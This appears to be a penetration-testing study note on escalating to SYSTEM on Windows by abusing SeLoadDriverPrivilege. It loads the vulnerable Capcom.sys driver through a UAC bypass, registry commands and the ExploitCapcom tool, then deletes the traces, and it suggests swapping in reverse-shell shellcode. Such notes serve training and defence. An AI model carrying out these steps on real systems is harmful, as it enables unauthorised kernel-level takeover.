# **Exploiting SeLoadDriverPrivilege Using Capcom.sys**

## **Key Concepts**

* **SeLoadDriverPrivilege**

  * Granted to groups such as **Print Operators**.
  * Allows loading kernel-mode drivers.
  * Often disabled until elevated (requires UAC bypass unless full admin token is present).

* **Capcom.sys (Vulnerable Driver)**

  * Known vulnerable driver enabling **arbitrary kernel-mode code execution**, leading directly to **SYSTEM**.

* **Registry Manipulation**

  * Used to register the malicious/vulnerable driver before loading it.

* **Exploitation Tools**

  * `EnableSeLoadDriverPrivilege.exe`
  * `ExploitCapcom.exe`
  * `EoPLoadDriver.exe` (auto-loading helper)

---

# **Approach, Commands, Tools, Techniques**

## **1. Check Privileges**

```powershell
whoami /priv
```

Look for:

```
SeLoadDriverPrivilege    Disabled
```

If it’s present but disabled - elevate (UAC bypass) to enable.

---

## **2. UAC Bypass (If Needed)**

Tools:

* **UACMe**
* Run from high-integrity admin cmd/powershell

Goal:

* Obtain a process with a full admin token (to enable SeLoadDriverPrivilege).

---

## **3. Prepare Driver Registry Keys**

> **Note:** `HKCU\System\CurrentControlSet` *does NOT work on Windows 10 1803+*.
> On modern systems, you must write to **HKLM**, which requires elevated admin.

```powershell
reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
```

---

## **4. Verify Driver File**

Use NirSoft DriverView:

```
DriverView.exe
```

---

## **5. Enable the Privilege**

```powershell
EnableSeLoadDriverPrivilege.exe
```

This patches the process token to actively enable `SeLoadDriverPrivilege`.

---

## **6. Load the Driver**

Two methods:

### **Manual (via registry + system call)**

(Hand-rolled drivers rely on native API calls—usually implemented inside the loader tool.)

### **Automated**

```powershell
EoPLoadDriver.exe System\CurrentControlSet\Capcom C:\Tools\Capcom.sys
```

---

## **7. Exploit the Driver**

```powershell
ExploitCapcom.exe
```

If you need a reverse shell or custom system command:

* Modify `ExploitCapcom.cpp` - replace payload shellcode
* Recompile with `cl.exe`

---

## **8. Cleanup**

```powershell
reg delete HKCU\System\CurrentControlSet\Capcom /f
```

---

# **Tools Used**

| Tool                                | Purpose                                      |
| ----------------------------------- | -------------------------------------------- |
| **UACMe**                           | UAC bypass to gain full token                |
| **EnableSeLoadDriverPrivilege.exe** | Enables SeLoadDriverPrivilege                |
| **DriverView.exe**                  | Confirms driver load                         |
| **ExploitCapcom.exe**               | Trigger SYSTEM payload via vulnerable driver |
| **EoPLoadDriver.exe**               | Automates loading arbitrary drivers          |
| **cl.exe**                          | Compile custom exploit binary                |
